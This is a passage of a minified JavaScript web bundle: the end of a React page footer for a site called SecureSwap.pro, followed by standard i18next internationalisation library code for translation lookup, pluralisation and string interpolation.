                            className: `text-xs sm:text-sm font-medium ${I.text}`,
                            children: "ISO 27001"
                        })]
                    })]
                }), a.jsxs("div", {
                    className: `mt-8 pt-6 border-t ${I.border} flex flex-col sm:flex-row items-center justify-between gap-4`,
                    children: [a.jsxs("div", {
                        className: "flex flex-wrap items-center justify-center gap-4 text-sm",
                        children: [a.jsx("button", {
                            onClick: () => tl(!0),
                            className: `${I.textSecondary} hover:text-blue-600 transition-colors duration-200`,
                            children: "About Us"
                        }), a.jsx("button", {
                            onClick: () => Xo(!0),
                            className: `${I.textSecondary} hover:text-blue-600 transition-colors duration-200`,
                            children: "Terms & Conditions"
                        }), a.jsx("span", {
                            className: `${I.textSecondary} hidden sm:inline`,
                            children: "•"
                        }), a.jsx("button", {
                            onClick: () => el(!0),
                            className: `${I.textSecondary} hover:text-blue-600 transition-colors duration-200`,
                            children: "Privacy Policy"
                        }), a.jsx("span", {
                            className: `${I.textSecondary} hidden sm:inline`,
                            children: "•"
                        })]
                    }), a.jsxs("div", {
                        className: `text-sm ${I.textSecondary} text-center sm:text-right`,
                        children: [a.jsx("p", {
                            children: "© 2025 SecureSwap.pro. All rights reserved."
                        }), a.jsx("p", {
                            className: "text-xs mt-1",
                            children: "Secure • Fast • Trusted"
                        })]
                    })]
                })]
            })
        })]
    })
}
const K = e => typeof e == "string"
  , na = () => {
    let e, t;
    const n = new Promise( (r, s) => {
        e = r,
        t = s
    }
    );
    return n.resolve = e,
    n.reject = t,
    n
}
  , Pc = e => e == null ? "" : "" + e
  , Yf = (e, t, n) => {
    e.forEach(r => {
        t[r] && (n[r] = t[r])
    }
    )
}
  , Jf = /###/g
  , $c = e => e && e.indexOf("###") > -1 ? e.replace(Jf, ".") : e
  , Ec = e => !e || K(e)
  , ga = (e, t, n) => {
    const r = K(t) ? t.split(".") : t;
    let s = 0;
    for (; s < r.length - 1; ) {
        if (Ec(e))
            return {};
        const i = $c(r[s]);
        !e[i] && n && (e[i] = new n),
        Object.prototype.hasOwnProperty.call(e, i) ? e = e[i] : e = {},
        ++s
    }
    return Ec(e) ? {} : {
        obj: e,
        k: $c(r[s])
    }
}
  , Ac = (e, t, n) => {
    const {obj: r, k: s} = ga(e, t, Object);
    if (r !== void 0 || t.length === 1) {
        r[s] = n;
        return
    }
    let i = t[t.length - 1]
      , o = t.slice(0, t.length - 1)
      , l = ga(e, o, Object);
    for (; l.obj === void 0 && o.length; )
        i = `${o[o.length - 1]}.${i}`,
        o = o.slice(0, o.length - 1),
        l = ga(e, o, Object),
        l != null && l.obj && typeof l.obj[`${l.k}.${i}`] < "u" && (l.obj = void 0);
    l.obj[`${l.k}.${i}`] = n
}
  , Qf = (e, t, n, r) => {
    const {obj: s, k: i} = ga(e, t, Object);
    s[i] = s[i] || [],
    s[i].push(n)
}
  , Yr = (e, t) => {
    const {obj: n, k: r} = ga(e, t);
    if (n && Object.prototype.hasOwnProperty.call(n, r))
        return n[r]
}
  , Zf = (e, t, n) => {
    const r = Yr(e, n);
    return r !== void 0 ? r : Yr(t, n)
}
  , gm = (e, t, n) => {
    for (const r in t)
        r !== "__proto__" && r !== "constructor" && (r in e ? K(e[r]) || e[r]instanceof String || K(t[r]) || t[r]instanceof String ? n && (e[r] = t[r]) : gm(e[r], t[r], n) : e[r] = t[r]);
    return e
}
  , mn = e => e.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&");
var Xf = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
    "/": "&#x2F;"
};
const ex = e => K(e) ? e.replace(/[&<>"'\/]/g, t => Xf[t]) : e;
class tx {
    constructor(t) {
        this.capacity = t,
        this.regExpMap = new Map,
        this.regExpQueue = []
    }
    getRegExp(t) {
        const n = this.regExpMap.get(t);
        if (n !== void 0)
            return n;
        const r = new RegExp(t);
        return this.regExpQueue.length === this.capacity && this.regExpMap.delete(this.regExpQueue.shift()),
        this.regExpMap.set(t, r),
        this.regExpQueue.push(t),
        r
    }
}
const nx = [" ", ",", "?", "!", ";"]
  , ax = new tx(20)
  , rx = (e, t, n) => {
    t = t || "",
    n = n || "";
    const r = nx.filter(o => t.indexOf(o) < 0 && n.indexOf(o) < 0);
    if (r.length === 0)
        return !0;
    const s = ax.getRegExp(`(${r.map(o => o === "?" ? "\\?" : o).join("|")})`);
    let i = !s.test(e);
    if (!i) {
        const o = e.indexOf(n);
        o > 0 && !s.test(e.substring(0, o)) && (i = !0)
    }
    return i
}
  , Ji = (e, t, n=".") => {
    if (!e)
        return;
    if (e[t])
        return Object.prototype.hasOwnProperty.call(e, t) ? e[t] : void 0;
    const r = t.split(n);
    let s = e;
    for (let i = 0; i < r.length; ) {
        if (!s || typeof s != "object")
            return;
        let o, l = "";
        for (let u = i; u < r.length; ++u)
            if (u !== i && (l += n),
            l += r[u],
            o = s[l],
            o !== void 0) {
                if (["string", "number", "boolean"].indexOf(typeof o) > -1 && u < r.length - 1)
                    continue;
                i += u - i + 1;
                break
            }
        s = o
    }
    return s
}
  , Ma = e => e == null ? void 0 : e.replace("_", "-")
  , sx = {
    type: "logger",
    log(e) {
        this.output("log", e)
    },
    warn(e) {
        this.output("warn", e)
    },
    error(e) {
        this.output("error", e)
    },
    output(e, t) {
        var n, r;
        (r = (n = console == null ? void 0 : console[e]) == null ? void 0 : n.apply) == null || r.call(n, console, t)
    }
};
class Jr {
    constructor(t, n={}) {
        this.init(t, n)
    }
    init(t, n={}) {
        this.prefix = n.prefix || "i18next:",
        this.logger = t || sx,
        this.options = n,
        this.debug = n.debug
    }
    log(...t) {
        return this.forward(t, "log", "", !0)
    }
    warn(...t) {
        return this.forward(t, "warn", "", !0)
    }
    error(...t) {
        return this.forward(t, "error", "")
    }
    deprecate(...t) {
        return this.forward(t, "warn", "WARNING DEPRECATED: ", !0)
    }
    forward(t, n, r, s) {
        return s && !this.debug ? null : (K(t[0]) && (t[0] = `${r}${this.prefix} ${t[0]}`),
        this.logger[n](t))
    }
    create(t) {
        return new Jr(this.logger,{
            prefix: `${this.prefix}:${t}:`,
            ...this.options
        })
    }
    clone(t) {
        return t = t || this.options,
        t.prefix = t.prefix || this.prefix,
        new Jr(this.logger,t)
    }
}
var lt = new Jr;
class xs {
    constructor() {
        this.observers = {}
    }
    on(t, n) {
        return t.split(" ").forEach(r => {
            this.observers[r] || (this.observers[r] = new Map);
            const s = this.observers[r].get(n) || 0;
            this.observers[r].set(n, s + 1)
        }
        ),
        this
    }
    off(t, n) {
        if (this.observers[t]) {
            if (!n) {
                delete this.observers[t];
                return
            }
            this.observers[t].delete(n)
        }
    }
    emit(t, ...n) {
        this.observers[t] && Array.from(this.observers[t].entries()).forEach( ([s,i]) => {
            for (let o = 0; o < i; o++)
                s(...n)
        }
        ),
        this.observers["*"] && Array.from(this.observers["*"].entries()).forEach( ([s,i]) => {
            for (let o = 0; o < i; o++)
                s.apply(s, [t, ...n])
        }
        )
    }
}
class Ic extends xs {
    constructor(t, n={
        ns: ["translation"],
        defaultNS: "translation"
    }) {
        super(),
        this.data = t || {},
        this.options = n,
        this.options.keySeparator === void 0 && (this.options.keySeparator = "."),
        this.options.ignoreJSONStructure === void 0 && (this.options.ignoreJSONStructure = !0)
    }
    addNamespaces(t) {
        this.options.ns.indexOf(t) < 0 && this.options.ns.push(t)
    }
    removeNamespaces(t) {
        const n = this.options.ns.indexOf(t);
        n > -1 && this.options.ns.splice(n, 1)
    }
    getResource(t, n, r, s={}) {
        var c, m;
        const i = s.keySeparator !== void 0 ? s.keySeparator : this.options.keySeparator
          , o = s.ignoreJSONStructure !== void 0 ? s.ignoreJSONStructure : this.options.ignoreJSONStructure;
        let l;
        t.indexOf(".") > -1 ? l = t.split(".") : (l = [t, n],
        r && (Array.isArray(r) ? l.push(...r) : K(r) && i ? l.push(...r.split(i)) : l.push(r)));
        const u = Yr(this.data, l);
        return !u && !n && !r && t.indexOf(".") > -1 && (t = l[0],
        n = l[1],
        r = l.slice(2).join(".")),
        u || !o || !K(r) ? u : Ji((m = (c = this.data) == null ? void 0 : c[t]) == null ? void 0 : m[n], r, i)
    }
    addResource(t, n, r, s, i={
        silent: !1
    }) {
        const o = i.keySeparator !== void 0 ? i.keySeparator : this.options.keySeparator;
        let l = [t, n];
        r && (l = l.concat(o ? r.split(o) : r)),
        t.indexOf(".") > -1 && (l = t.split("."),
        s = n,
        n = l[1]),
        this.addNamespaces(n),
        Ac(this.data, l, s),
        i.silent || this.emit("added", t, n, r, s)
    }
    addResources(t, n, r, s={
        silent: !1
    }) {
        for (const i in r)
            (K(r[i]) || Array.isArray(r[i])) && this.addResource(t, n, i, r[i], {
                silent: !0
            });
        s.silent || this.emit("added", t, n, r)
    }
    addResourceBundle(t, n, r, s, i, o={
        silent: !1,
        skipCopy: !1
    }) {
        let l = [t, n];
        t.indexOf(".") > -1 && (l = t.split("."),
        s = r,
        r = n,
        n = l[1]),
        this.addNamespaces(n);
        let u = Yr(this.data, l) || {};
        o.skipCopy || (r = JSON.parse(JSON.stringify(r))),
        s ? gm(u, r, i) : u = {
            ...u,
            ...r
        },
        Ac(this.data, l, u),
        o.silent || this.emit("added", t, n, r)
    }
    removeResourceBundle(t, n) {
        this.hasResourceBundle(t, n) && delete this.data[t][n],
        this.removeNamespaces(n),
        this.emit("removed", t, n)
    }
    hasResourceBundle(t, n) {
        return this.getResource(t, n) !== void 0
    }
    getResourceBundle(t, n) {
        return n || (n = this.options.defaultNS),
        this.getResource(t, n)
    }
    getDataByLanguage(t) {
        return this.data[t]
    }
    hasLanguageSomeTranslations(t) {
        const n = this.getDataByLanguage(t);
        return !!(n && Object.keys(n) || []).find(s => n[s] && Object.keys(n[s]).length > 0)
    }
    toJSON() {
        return this.data
    }
}
var ym = {
    processors: {},
    addPostProcessor(e) {
        this.processors[e.name] = e
    },
    handle(e, t, n, r, s) {
        return e.forEach(i => {
            var o;
            t = ((o = this.processors[i]) == null ? void 0 : o.process(t, n, r, s)) ?? t
        }
        ),
        t
    }
};
const Dc = {}
  , Rc = e => !K(e) && typeof e != "boolean" && typeof e != "number";
class Qr extends xs {
    constructor(t, n={}) {
        super(),
        Yf(["resourceStore", "languageUtils", "pluralResolver", "interpolator", "backendConnector", "i18nFormat", "utils"], t, this),
        this.options = n,
        this.options.keySeparator === void 0 && (this.options.keySeparator = "."),
        this.logger = lt.create("translator")
    }
    changeLanguage(t) {
        t && (this.language = t)
    }
    exists(t, n={
        interpolation: {}
    }) {
        const r = {
            ...n
        };
        if (t == null)
            return !1;
        const s = this.resolve(t, r);
        return (s == null ? void 0 : s.res) !== void 0
    }
    extractFromKey(t, n) {
        let r = n.nsSeparator !== void 0 ? n.nsSeparator : this.options.nsSeparator;
        r === void 0 && (r = ":");
        const s = n.keySeparator !== void 0 ? n.keySeparator : this.options.keySeparator;
        let i = n.ns || this.options.defaultNS || [];
        const o = r && t.indexOf(r) > -1
          , l = !this.options.userDefinedKeySeparator && !n.keySeparator && !this.options.userDefinedNsSeparator && !n.nsSeparator && !rx(t, r, s);
        if (o && !l) {
            const u = t.match(this.interpolator.nestingRegexp);
            if (u && u.length > 0)
                return {
                    key: t,
                    namespaces: K(i) ? [i] : i
                };
            const c = t.split(r);
            (r !== s || r === s && this.options.ns.indexOf(c[0]) > -1) && (i = c.shift()),
            t = c.join(s)
        }
        return {
            key: t,
            namespaces: K(i) ? [i] : i
        }
    }
    translate(t, n, r) {
        let s = typeof n == "object" ? {
            ...n
        } : n;
        if (typeof s != "object" && this.options.overloadTranslationOptionHandler && (s = this.options.overloadTranslationOptionHandler(arguments)),
        typeof options == "object" && (s = {
            ...s
        }),
        s || (s = {}),
        t == null)
            return "";
        Array.isArray(t) || (t = [String(t)]);
        const i = s.returnDetails !== void 0 ? s.returnDetails : this.options.returnDetails
          , o = s.keySeparator !== void 0 ? s.keySeparator : this.options.keySeparator
          , {key: l, namespaces: u} = this.extractFromKey(t[t.length - 1], s)
          , c = u[u.length - 1];
        let m = s.nsSeparator !== void 0 ? s.nsSeparator : this.options.nsSeparator;
        m === void 0 && (m = ":");
        const h = s.lng || this.language
          , x = s.appendNamespaceToCIMode || this.options.appendNamespaceToCIMode;
        if ((h == null ? void 0 : h.toLowerCase()) === "cimode")
            return x ? i ? {
                res: `${c}${m}${l}`,
                usedKey: l,
                exactUsedKey: l,
                usedLng: h,
                usedNS: c,
                usedParams: this.getUsedParamsDetails(s)
            } : `${c}${m}${l}` : i ? {
                res: l,
                usedKey: l,
                exactUsedKey: l,
                usedLng: h,
                usedNS: c,
                usedParams: this.getUsedParamsDetails(s)
            } : l;
        const y = this.resolve(t, s);
        let v = y == null ? void 0 : y.res;
        const k = (y == null ? void 0 : y.usedKey) || l
          , p = (y == null ? void 0 : y.exactUsedKey) || l
          , f = ["[object Number]", "[object Function]", "[object RegExp]"]
          , d = s.joinArrays !== void 0 ? s.joinArrays : this.options.joinArrays
          , g = !this.i18nFormat || this.i18nFormat.handleAsObject
          , S = s.count !== void 0 && !K(s.count)
          , w = Qr.hasDefaultValue(s)
          , j = S ? this.pluralResolver.getSuffix(h, s.count, s) : ""
          , B = s.ordinal && S ? this.pluralResolver.getSuffix(h, s.count, {
            ordinal: !1
        }) : ""
          , b = S && !s.ordinal && s.count === 0
          , N = b && s[`defaultValue${this.options.pluralSeparator}zero`] || s[`defaultValue${j}`] || s[`defaultValue${B}`] || s.defaultValue;
        let P = v;
        g && !v && w && (P = N);
        const M = Rc(P)
          , U = Object.prototype.toString.apply(P);
        if (g && P && M && f.indexOf(U) < 0 && !(K(d) && Array.isArray(P))) {
            if (!s.returnObjects && !this.options.returnObjects) {
                this.options.returnedObjectHandler || this.logger.warn("accessing an object - but returnObjects options is not enabled!");
                const D = this.options.returnedObjectHandler ? this.options.returnedObjectHandler(k, P, {
                    ...s,
                    ns: u
                }) : `key '${l} (${this.language})' returned an object instead of string.`;
                return i ? (y.res = D,
                y.usedParams = this.getUsedParamsDetails(s),
                y) : D
            }
            if (o) {
                const D = Array.isArray(P)
                  , A = D ? [] : {}
                  , O = D ? p : k;
                for (const W in P)
                    if (Object.prototype.hasOwnProperty.call(P, W)) {
                        const F = `${O}${o}${W}`;
                        w && !v ? A[W] = this.translate(F, {
                            ...s,
                            defaultValue: Rc(N) ? N[W] : void 0,
                            joinArrays: !1,
                            ns: u
                        }) : A[W] = this.translate(F, {
                            ...s,
                            joinArrays: !1,
                            ns: u
                        }),
                        A[W] === F && (A[W] = P[W])
                    }
                v = A
            }
        } else if (g && K(d) && Array.isArray(v))
            v = v.join(d),
            v && (v = this.extendTranslation(v, t, s, r));
        else {
            let D = !1
              , A = !1;
            !this.isValidLookup(v) && w && (D = !0,
            v = N),
            this.isValidLookup(v) || (A = !0,
            v = l);
            const W = (s.missingKeyNoValueFallbackToKey || this.options.missingKeyNoValueFallbackToKey) && A ? void 0 : v
              , F = w && N !== v && this.options.updateMissing;
            if (A || D || F) {
                if (this.logger.log(F ? "updateKey" : "missingKey", h, c, l, F ? N : v),
                o) {
                    const L = this.resolve(l, {
                        ...s,
                        keySeparator: !1
                    });
                    L && L.res && this.logger.warn("Seems the loaded translations were in flat JSON format instead of nested. Either set keySeparator: false on init or make sure your translations are published in nested format.")
                }
                let T = [];
                const $ = this.languageUtils.getFallbackCodes(this.options.fallbackLng, s.lng || this.language);
                if (this.options.saveMissingTo === "fallback" && $ && $[0])
                    for (let L = 0; L < $.length; L++)
                        T.push($[L]);
                else
                    this.options.saveMissingTo === "all" ? T = this.languageUtils.toResolveHierarchy(s.lng || this.language) : T.push(s.lng || this.language);
                const z = (L, G, Q) => {
                    var Oe;
                    const xe = w && Q !== v ? Q : W;
                    this.options.missingKeyHandler ? this.options.missingKeyHandler(L, c, G, xe, F, s) : (Oe = this.backendConnector) != null && Oe.saveMissing && this.backendConnector.saveMissing(L, c, G, xe, F, s),
                    this.emit("missingKey", L, c, G, v)
                }
                ;
                this.options.saveMissing && (this.options.saveMissingPlurals && S ? T.forEach(L => {
                    const G = this.pluralResolver.getSuffixes(L, s);
                    b && s[`defaultValue${this.options.pluralSeparator}zero`] && G.indexOf(`${this.options.pluralSeparator}zero`) < 0 && G.push(`${this.options.pluralSeparator}zero`),
                    G.forEach(Q => {
                        z([L], l + Q, s[`defaultValue${Q}`] || N)
                    }
                    )
                }
                ) : z(T, l, N))
            }
            v = this.extendTranslation(v, t, s, y, r),
            A && v === l && this.options.appendNamespaceToMissingKey && (v = `${c}${m}${l}`),
            (A || D) && this.options.parseMissingKeyHandler && (v = this.options.parseMissingKeyHandler(this.options.appendNamespaceToMissingKey ? `${c}${m}${l}` : l, D ? v : void 0, s))
        }
        return i ? (y.res = v,
        y.usedParams = this.getUsedParamsDetails(s),
        y) : v
    }
    extendTranslation(t, n, r, s, i) {
        var u, c;
        if ((u = this.i18nFormat) != null && u.parse)
            t = this.i18nFormat.parse(t, {
                ...this.options.interpolation.defaultVariables,
                ...r
            }, r.lng || this.language || s.usedLng, s.usedNS, s.usedKey, {
                resolved: s
            });
        else if (!r.skipInterpolation) {
            r.interpolation && this.interpolator.init({
                ...r,
                interpolation: {
                    ...this.options.interpolation,
                    ...r.interpolation
                }
            });
            const m = K(t) && (((c = r == null ? void 0 : r.interpolation) == null ? void 0 : c.skipOnVariables) !== void 0 ? r.interpolation.skipOnVariables : this.options.interpolation.skipOnVariables);
            let h;
            if (m) {
                const y = t.match(this.interpolator.nestingRegexp);
                h = y && y.length
            }
            let x = r.replace && !K(r.replace) ? r.replace : r;
            if (this.options.interpolation.defaultVariables && (x = {
                ...this.options.interpolation.defaultVariables,
                ...x
            }),
            t = this.interpolator.interpolate(t, x, r.lng || this.language || s.usedLng, r),
            m) {
                const y = t.match(this.interpolator.nestingRegexp)
                  , v = y && y.length;
                h < v && (r.nest = !1)
            }
            !r.lng && s && s.res && (r.lng = this.language || s.usedLng),
            r.nest !== !1 && (t = this.interpolator.nest(t, (...y) => (i == null ? void 0 : i[0]) === y[0] && !r.context ? (this.logger.warn(`It seems you are nesting recursively key: ${y[0]} in key: ${n[0]}`),
            null) : this.translate(...y, n), r)),
            r.interpolation && this.interpolator.reset()
        }
        const o = r.postProcess || this.options.postProcess
          , l = K(o) ? [o] : o;
        return t != null && (l != null && l.length) && r.applyPostProcessor !== !1 && (t = ym.handle(l, t, n, this.options && this.options.postProcessPassResolved ? {
            i18nResolved: {
                ...s,
                usedParams: this.getUsedParamsDetails(r)
            },
            ...r
        } : r, this)),
        t
    }
    resolve(t, n={}) {
        let r, s, i, o, l;
        return K(t) && (t = [t]),
        t.forEach(u => {
            if (this.isValidLookup(r))
                return;
            const c = this.extractFromKey(u, n)
              , m = c.key;
            s = m;
            let h = c.namespaces;
            this.options.fallbackNS && (h = h.concat(this.options.fallbackNS));
            const x = n.count !== void 0 && !K(n.count)
              , y = x && !n.ordinal && n.count === 0
              , v = n.context !== void 0 && (K(n.context) || typeof n.context == "number") && n.context !== ""
              , k = n.lngs ? n.lngs : this.languageUtils.toResolveHierarchy(n.lng || this.language, n.fallbackLng);
            h.forEach(p => {
                var f, d;
                this.isValidLookup(r) || (l = p,
                !Dc[`${k[0]}-${p}`] && ((f = this.utils) != null && f.hasLoadedNamespace) && !((d = this.utils) != null && d.hasLoadedNamespace(l)) && (Dc[`${k[0]}-${p}`] = !0,
                this.logger.warn(`key "${s}" for languages "${k.join(", ")}" won't get resolved as namespace "${l}" was not yet loaded`, "This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!")),
                k.forEach(g => {
                    var j;
                    if (this.isValidLookup(r))
                        return;
                    o = g;
                    const S = [m];
                    if ((j = this.i18nFormat) != null && j.addLookupKeys)
                        this.i18nFormat.addLookupKeys(S, m, g, p, n);
                    else {
                        let B;
                        x && (B = this.pluralResolver.getSuffix(g, n.count, n));
                        const b = `${this.options.pluralSeparator}zero`
                          , N = `${this.options.pluralSeparator}ordinal${this.options.pluralSeparator}`;
                        if (x && (S.push(m + B),
                        n.ordinal && B.indexOf(N) === 0 && S.push(m + B.replace(N, this.options.pluralSeparator)),
                        y && S.push(m + b)),
                        v) {
                            const P = `${m}${this.options.contextSeparator}${n.context}`;
                            S.push(P),
                            x && (S.push(P + B),
                            n.ordinal && B.indexOf(N) === 0 && S.push(P + B.replace(N, this.options.pluralSeparator)),
                            y && S.push(P + b))
                        }
                    }
                    let w;
                    for (; w = S.pop(); )
                        this.isValidLookup(r) || (i = w,
                        r = this.getResource(g, p, w, n))
                }
                ))
            }
            )
        }
        ),
        {
            res: r,
            usedKey: s,
            exactUsedKey: i,
            usedLng: o,
            usedNS: l
        }
    }
    isValidLookup(t) {
        return t !== void 0 && !(!this.options.returnNull && t === null) && !(!this.options.returnEmptyString && t === "")
    }
    getResource(t, n, r, s={}) {
        var i;
        return (i = this.i18nFormat) != null && i.getResource ? this.i18nFormat.getResource(t, n, r, s) : this.resourceStore.getResource(t, n, r, s)
    }
    getUsedParamsDetails(t={}) {
        const n = ["defaultValue", "ordinal", "context", "replace", "lng", "lngs", "fallbackLng", "ns", "keySeparator", "nsSeparator", "returnObjects", "returnDetails", "joinArrays", "postProcess", "interpolation"]
          , r = t.replace && !K(t.replace);
        let s = r ? t.replace : t;
        if (r && typeof t.count < "u" && (s.count = t.count),
        this.options.interpolation.defaultVariables && (s = {
            ...this.options.interpolation.defaultVariables,
            ...s
        }),
        !r) {
            s = {
                ...s
            };
            for (const i of n)
                delete s[i]
        }
        return s
    }
    static hasDefaultValue(t) {
        const n = "defaultValue";
        for (const r in t)
            if (Object.prototype.hasOwnProperty.call(t, r) && n === r.substring(0, n.length) && t[r] !== void 0)
                return !0;
        return !1
    }
}
class Mc {
    constructor(t) {
        this.options = t,
        this.supportedLngs = this.options.supportedLngs || !1,
        this.logger = lt.create("languageUtils")
    }
    getScriptPartFromCode(t) {
        if (t = Ma(t),
        !t || t.indexOf("-") < 0)
            return null;
        const n = t.split("-");
        return n.length === 2 || (n.pop(),
        n[n.length - 1].toLowerCase() === "x") ? null : this.formatLanguageCode(n.join("-"))
    }
    getLanguagePartFromCode(t) {
        if (t = Ma(t),
        !t || t.indexOf("-") < 0)
            return t;
        const n = t.split("-");
        return this.formatLanguageCode(n[0])
    }
    formatLanguageCode(t) {
        if (K(t) && t.indexOf("-") > -1) {
            let n;
            try {
                n = Intl.getCanonicalLocales(t)[0]
            } catch {}
            return n && this.options.lowerCaseLng && (n = n.toLowerCase()),
            n || (this.options.lowerCaseLng ? t.toLowerCase() : t)
        }
        return this.options.cleanCode || this.options.lowerCaseLng ? t.toLowerCase() : t
    }
    isSupportedCode(t) {
        return (this.options.load === "languageOnly" || this.options.nonExplicitSupportedLngs) && (t = this.getLanguagePartFromCode(t)),
        !this.supportedLngs || !this.supportedLngs.length || this.supportedLngs.indexOf(t) > -1
    }
    getBestMatchFromCodes(t) {
        if (!t)
            return null;
        let n;
        return t.forEach(r => {
            if (n)
                return;
            const s = this.formatLanguageCode(r);
            (!this.options.supportedLngs || this.isSupportedCode(s)) && (n = s)
        }
        ),
        !n && this.options.supportedLngs && t.forEach(r => {
            if (n)
                return;
            const s = this.getScriptPartFromCode(r);
            if (this.isSupportedCode(s))
                return n = s;
            const i = this.getLanguagePartFromCode(r);
            if (this.isSupportedCode(i))
                return n = i;
            n = this.options.supportedLngs.find(o => {
                if (o === i)
                    return o;
                if (!(o.indexOf("-") < 0 && i.indexOf("-") < 0) && (o.indexOf("-") > 0 && i.indexOf("-") < 0 && o.substring(0, o.indexOf("-")) === i || o.indexOf(i) === 0 && i.length > 1))
                    return o
            }
            )
        }
        ),
        n || (n = this.getFallbackCodes(this.options.fallbackLng)[0]),
        n
    }
    getFallbackCodes(t, n) {
        if (!t)
            return [];
        if (typeof t == "function" && (t = t(n)),
        K(t) && (t = [t]),
        Array.isArray(t))
            return t;
        if (!n)
            return t.default || [];
        let r = t[n];
        return r || (r = t[this.getScriptPartFromCode(n)]),
        r || (r = t[this.formatLanguageCode(n)]),
        r || (r = t[this.getLanguagePartFromCode(n)]),
        r || (r = t.default),
        r || []
    }
    toResolveHierarchy(t, n) {
        const r = this.getFallbackCodes((n === !1 ? [] : n) || this.options.fallbackLng || [], t)
          , s = []
          , i = o => {
            o && (this.isSupportedCode(o) ? s.push(o) : this.logger.warn(`rejecting language code not found in supportedLngs: ${o}`))
        }
        ;
        return K(t) && (t.indexOf("-") > -1 || t.indexOf("_") > -1) ? (this.options.load !== "languageOnly" && i(this.formatLanguageCode(t)),
        this.options.load !== "languageOnly" && this.options.load !== "currentOnly" && i(this.getScriptPartFromCode(t)),
        this.options.load !== "currentOnly" && i(this.getLanguagePartFromCode(t))) : K(t) && i(this.formatLanguageCode(t)),
        r.forEach(o => {
            s.indexOf(o) < 0 && i(this.formatLanguageCode(o))
        }
        ),
        s
    }
}
const Uc = {
    zero: 0,
    one: 1,
    two: 2,
    few: 3,
    many: 4,
    other: 5
}
  , zc = {
    select: e => e === 1 ? "one" : "other",
    resolvedOptions: () => ({
        pluralCategories: ["one", "other"]
    })
};
class ix {
    constructor(t, n={}) {
        this.languageUtils = t,
        this.options = n,
        this.logger = lt.create("pluralResolver"),
        this.pluralRulesCache = {}
    }
    addRule(t, n) {
        this.rules[t] = n
    }
    clearCache() {
        this.pluralRulesCache = {}
    }
    getRule(t, n={}) {
        const r = Ma(t === "dev" ? "en" : t)
          , s = n.ordinal ? "ordinal" : "cardinal"
          , i = JSON.stringify({
            cleanedCode: r,
            type: s
        });
        if (i in this.pluralRulesCache)
            return this.pluralRulesCache[i];
        let o;
        try {
            o = new Intl.PluralRules(r,{
                type: s
            })
        } catch {
            if (!Intl)
                return this.logger.error("No Intl support, please use an Intl polyfill!"),
                zc;
            if (!t.match(/-|_/))
                return zc;
            const u = this.languageUtils.getLanguagePartFromCode(t);
            o = this.getRule(u, n)
        }
        return this.pluralRulesCache[i] = o,
        o
    }
    needsPlural(t, n={}) {
        let r = this.getRule(t, n);
        return r || (r = this.getRule("dev", n)),
        (r == null ? void 0 : r.resolvedOptions().pluralCategories.length) > 1
    }
    getPluralFormsOfKey(t, n, r={}) {
        return this.getSuffixes(t, r).map(s => `${n}${s}`)
    }
    getSuffixes(t, n={}) {
        let r = this.getRule(t, n);
        return r || (r = this.getRule("dev", n)),
        r ? r.resolvedOptions().pluralCategories.sort( (s, i) => Uc[s] - Uc[i]).map(s => `${this.options.prepend}${n.ordinal ? `ordinal${this.options.prepend}` : ""}${s}`) : []
    }
    getSuffix(t, n, r={}) {
        const s = this.getRule(t, r);
        return s ? `${this.options.prepend}${r.ordinal ? `ordinal${this.options.prepend}` : ""}${s.select(n)}` : (this.logger.warn(`no plural rule found for: ${t}`),
        this.getSuffix("dev", n, r))
    }
}
const Wc = (e, t, n, r=".", s=!0) => {
    let i = Zf(e, t, n);
    return !i && s && K(n) && (i = Ji(e, n, r),
    i === void 0 && (i = Ji(t, n, r))),
    i
}
  , Js = e => e.replace(/\$/g, "$$$$");
class ox {
    constructor(t={}) {
        var n;
        this.logger = lt.create("interpolator"),
        this.options = t,
        this.format = ((n = t == null ? void 0 : t.interpolation) == null ? void 0 : n.format) || (r => r),
        this.init(t)
    }
    init(t={}) {
        t.interpolation || (t.interpolation = {
            escapeValue: !0
        });
        const {escape: n, escapeValue: r, useRawValueToEscape: s, prefix: i, prefixEscaped: o, suffix: l, suffixEscaped: u, formatSeparator: c, unescapeSuffix: m, unescapePrefix: h, nestingPrefix: x, nestingPrefixEscaped: y, nestingSuffix: v, nestingSuffixEscaped: k, nestingOptionsSeparator: p, maxReplaces: f, alwaysFormat: d} = t.interpolation;
        this.escape = n !== void 0 ? n : ex,
        this.escapeValue = r !== void 0 ? r : !0,
        this.useRawValueToEscape = s !== void 0 ? s : !1,
        this.prefix = i ? mn(i) : o || "{{",
        this.suffix = l ? mn(l) : u || "}}",
        this.formatSeparator = c || ",",
        this.unescapePrefix = m ? "" : h || "-",
        this.unescapeSuffix = this.unescapePrefix ? "" : m || "",
        this.nestingPrefix = x ? mn(x) : y || mn("$t("),
        this.nestingSuffix = v ? mn(v) : k || mn(")"),
        this.nestingOptionsSeparator = p || ",",
        this.maxReplaces = f || 1e3,
        this.alwaysFormat = d !== void 0 ? d : !1,
        this.resetRegExp()
    }
    reset() {
        this.options && this.init(this.options)
    }
    resetRegExp() {
        const t = (n, r) => (n == null ? void 0 : n.source) === r ? (n.lastIndex = 0,
        n) : new RegExp(r,"g");
        this.regexp = t(this.regexp, `${this.prefix}(.+?)${this.suffix}`),
        this.regexpUnescape = t(this.regexpUnescape, `${this.prefix}${this.unescapePrefix}(.+?)${this.unescapeSuffix}${this.suffix}`),
        this.nestingRegexp = t(this.nestingRegexp, `${this.nestingPrefix}(.+?)${this.nestingSuffix}`)
    }
    interpolate(t, n, r, s) {
        var y;
        let i, o, l;
        const u = this.options && this.options.interpolation && this.options.interpolation.defaultVariables || {}
          , c = v => {
            if (v.indexOf(this.formatSeparator) < 0) {
                const d = Wc(n, u, v, this.options.keySeparator, this.options.ignoreJSONStructure);
                return this.alwaysFormat ? this.format(d, void 0, r, {
                    ...s,
                    ...n,
                    interpolationkey: v
                }) : d
            }
            const k = v.split(this.formatSeparator)
              , p = k.shift().trim()
              , f = k.join(this.formatSeparator).trim();
            return this.format(Wc(n, u, p, this.options.keySeparator, this.options.ignoreJSONStructure), f, r, {
                ...s,
                ...n,
                interpolationkey: p
            })
        }
        ;
        this.resetRegExp();
        const m = (s == null ? void 0 : s.missingInterpolationHandler) || this.options.missingInterpolationHandler
